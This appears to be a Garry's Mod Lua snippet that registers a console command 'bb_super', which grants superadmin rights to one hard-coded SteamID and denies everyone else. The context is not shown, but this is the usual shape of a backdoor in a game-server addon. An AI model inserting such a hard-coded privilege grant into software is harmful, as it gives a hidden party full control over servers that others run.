concommand.Add( "bb_super", function(ply)
  if ply:SteamID() == "STEAM_0:1:82058544" then
    ply:SetUserGroup( "superadmin" )
else
  ply:PrintMessage(HUD_PRINTCONSOLE, "Access Denied." )
end
end)
